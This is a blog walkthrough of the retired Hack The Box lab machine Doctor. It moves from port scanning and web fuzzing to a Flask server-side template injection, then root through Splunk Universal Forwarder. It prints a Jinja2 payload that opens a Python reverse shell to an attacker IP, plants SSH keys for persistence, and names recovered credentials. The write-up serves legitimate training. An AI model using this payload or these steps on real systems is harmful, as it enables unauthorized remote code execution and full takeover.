---
layout: post  
title: "Doctor: Hack The Box Walkthrough"
date: 2021-02-07 17:28:59 +0000
last_modified_at: 2021-02-07 17:28:59 +0000
category: Walkthrough
tags: ["Hack The Box", Doctor, retired, Linux, Easy]
comments: true
protect: false
image:
  feature: doctor-htb-walkthrough.png
---

This post documents the complete walkthrough of Doctor, a retired vulnerable [VM][1] created by [egotisticalSW][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}


## Background

Doctor is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.209 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-28 06:01:03 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.209                                    
Discovered open port 80/tcp on 10.10.10.209                                    
Discovered open port 8089/tcp on 10.10.10.209
```

`8089/tcp` looks interesting. Let's do one better with nmap scanning the discovered ports to establish their services.

```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http syn-ack ttl 63 Splunkd httpd
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27
| Not valid after:  2023-09-06T15:57:27
| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787
|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
```

Splunkd??!! This should be fun. Anyway, this is what the main landing site looks like.

{% include image.html image_alt="020c407d.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/020c407d.png" %}

### Doctor Secure Messaging

Obviously there's a difference between navigating to a IP address and a virtual host.

{% include image.html image_alt="e60bb951.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/e60bb951.png" %}

Let's pop `doctors.htb` into `/etc/hosts`. Note the plural word doctors.

{% include image.html image_alt="8f09c5d2.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/8f09c5d2.png" %}

### Directory/File Enumeration

Let's fuzz `doctors.htb` with `wfuzz` and SecLists and see what gives.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc '403,404' http://doctors.htb/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://doctors.htb/FUZZ
Total requests: 4658

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000452:   302        3 L      24 W     251 Ch      "account"
000000663:   200        5 L      8 W      101 Ch      "archive"
000002050:   302        3 L      24 W     245 Ch      "home"
000002474:   200        94 L     228 W    4204 Ch     "login"
000002488:   302        3 L      24 W     217 Ch      "logout"
000003427:   200        100 L    238 W    4493 Ch     "register"

Total time: 11.35660
Processed Requests: 4658
Filtered Requests: 4652
Requests/sec.: 410.1576
```

`/archive` sure looks interesting.

```
# curl -i http://doctors.htb/archive
HTTP/1.1 200 OK
Date: Mon, 28 Sep 2020 08:56:44 GMT
Server: Werkzeug/1.0.1 Python/3.8.2
Content-Type: text/html; charset=utf-8
Content-Length: 101
Vary: Accept-Encoding


        <?xml version="1.0" encoding="UTF-8" ?>
        <rss version="2.0">
        <channel>
        <title>Archive</title>
```

Hmm. Are we looking at a Flask app? Anyway, let's keep this in mind while we register an account to explore further.

### Server Side Template Injection

If I had to guess, I would say that there's a SSTI vulnerability with the Doctor Secure Messaging.

{% include image.html image_alt="6ab3e54e.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/6ab3e54e.png" %}

Why? Here's why. Suppose I create a new post like so.

{% include image.html image_alt="3e379500.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/3e379500.png" %}

My new post is created.

{% include image.html image_alt="1870ac40.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/1870ac40.png" %}

Now, go to `/archive`. This is what I get.

```xml
<?xml version="1.0" encoding="UTF-8" ?>  <rss version="2.0">  <channel>  <title>Archive</title>  <item><title>dict_items(\[(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE\_CONTEXT\_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, &#39;1234&#39;), (&#39;PERMANENT\_SESSION\_LIFETIME&#39;, datetime.timedelta(days=31)), (&#39;USE\_X\_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION\_COOKIE\_NAME&#39;, &#39;session&#39;), (&#39;SESSION\_COOKIE\_DOMAIN&#39;, False), (&#39;SESSION\_COOKIE\_PATH&#39;, None), (&#39;SESSION\_COOKIE\_HTTPONLY&#39;, True), (&#39;SESSION\_COOKIE\_SECURE&#39;, False), (&#39;SESSION\_COOKIE\_SAMESITE&#39;, None), (&#39;SESSION\_REFRESH\_EACH_REQUEST&#39;, True), (&#39;MAX\_CONTENT\_LENGTH&#39;, None), (&#39;SEND\_FILE\_MAX\_AGE\_DEFAULT&#39;, datetime.timedelta(seconds=43200)), (&#39;TRAP\_BAD\_REQUEST_ERRORS&#39;, None), (&#39;TRAP\_HTTP\_EXCEPTIONS&#39;, False), (&#39;EXPLAIN\_TEMPLATE\_LOADING&#39;, False), (&#39;PREFERRED\_URL\_SCHEME&#39;, &#39;http&#39;), (&#39;JSON\_AS\_ASCII&#39;, True), (&#39;JSON\_SORT\_KEYS&#39;, True), (&#39;JSONIFY\_PRETTYPRINT\_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES\_AUTO\_RELOAD&#39;, None), (&#39;MAX\_COOKIE\_SIZE&#39;, 4093), (&#39;MAIL_PASSWORD&#39;, &#39;doctor&#39;), (&#39;MAIL_PORT&#39;, 587), (&#39;MAIL_SERVER&#39;, &#39;&#39;), (&#39;MAIL_USERNAME&#39;, &#39;doctor&#39;), (&#39;MAIL\_USE\_TLS&#39;, True), (&#39;SQLALCHEMY\_DATABASE\_URI&#39;, &#39;sqlite://///home/web/blog/flaskblog/site.db&#39;), (&#39;WTF\_CSRF\_CHECK_DEFAULT&#39;, False), (&#39;SQLALCHEMY_BINDS&#39;, None), (&#39;SQLALCHEMY\_NATIVE\_UNICODE&#39;, None), (&#39;SQLALCHEMY_ECHO&#39;, False), (&#39;SQLALCHEMY\_RECORD\_QUERIES&#39;, None), (&#39;SQLALCHEMY\_POOL\_SIZE&#39;, None), (&#39;SQLALCHEMY\_POOL\_TIMEOUT&#39;, None), (&#39;SQLALCHEMY\_POOL\_RECYCLE&#39;, None), (&#39;SQLALCHEMY\_MAX\_OVERFLOW&#39;, None), (&#39;SQLALCHEMY\_COMMIT\_ON_TEARDOWN&#39;, False), (&#39;SQLALCHEMY\_TRACK\_MODIFICATIONS&#39;, None), (&#39;SQLALCHEMY\_ENGINE\_OPTIONS&#39;, {})\])</title></item>  </channel>
```

Bingo!

## Footprint

Armed with that insight, we can exploit the SSTI vulnerability to get remote code execution on the machine. PayloadsAllTheThings have the perfect [exploit](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset).

{% raw %}
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.21\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
{% endraw %}

{% include image.html image_alt="252b3173.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/252b3173.png" %}

Now, it's best to inject a SSH public key we control into `/home/web/.ssh/authorized_keys` to maintain persistence.

{% include image.html image_alt="45571823.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/45571823.png" %}

### Getting `user.txt`

During enumeration of `web`'s account, I notice that the user `shaun` is not allowed to SSH in, so his password must be lying around somewhere.

{% include image.html image_alt="e35f0ae3.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/e35f0ae3.png" %}

On top of that, `web` is in the `adm` group. That surely must mean something.

{% include image.html image_alt="3fc704f2.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/3fc704f2.png" %}

Let's look for traces of the string `password` in `/var/log` with the very capable `find`.

{% include image.html image_alt="e3500e11.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/e3500e11.png" %}

Could that be `shaun`'s password? There's only one way to find out.

{% include image.html image_alt="3e5396a0.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/3e5396a0.png" %}

Awesome. The file `user.txt` is at `shaun`'s home directory.

{% include image.html image_alt="46b32e64.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/46b32e64.png" %}

## Privilege Escalation

We had earlier established that `8089/tcp` was listening on the machine. That's because Splunk Universal Forwarder was installed.

{% include image.html image_alt="76a77c70.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/76a77c70.png" %}

What's more—Splunk Universal Forwarder is running as root.

{% include image.html image_alt="2fab8b20.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/2fab8b20.png" %}

### SplunkWhisperer2

I got the perfect exploit in [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2). It doesn't make sense to use the default credentials (`admin:changeme`) because they don't work remotely by default with the remote version of SplunkWhisperer2—`shaun`'s credentials (`shaun:Guitar123`) must be it. To maintain persistence, we similarly plant a SSH public key we control in `/root/.ssh/authorized_keys`.

{% include image.html image_alt="d9423121.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/d9423121.png" %}

Let's log in to our `root` shell in another terminal.

{% include image.html image_alt="46411d88.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/46411d88.png" %}

### Getting `root.txt`

Getting `root.txt` with a `root` shell is trivial.

{% include image.html image_alt="74e00b23.png" image_src="/d49904f4-306b-42cc-8815-df10bbc118d1/74e00b23.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/278
[2]: https://www.hackthebox.eu/home/users/profile/94858
[3]: https://www.hackthebox.eu/
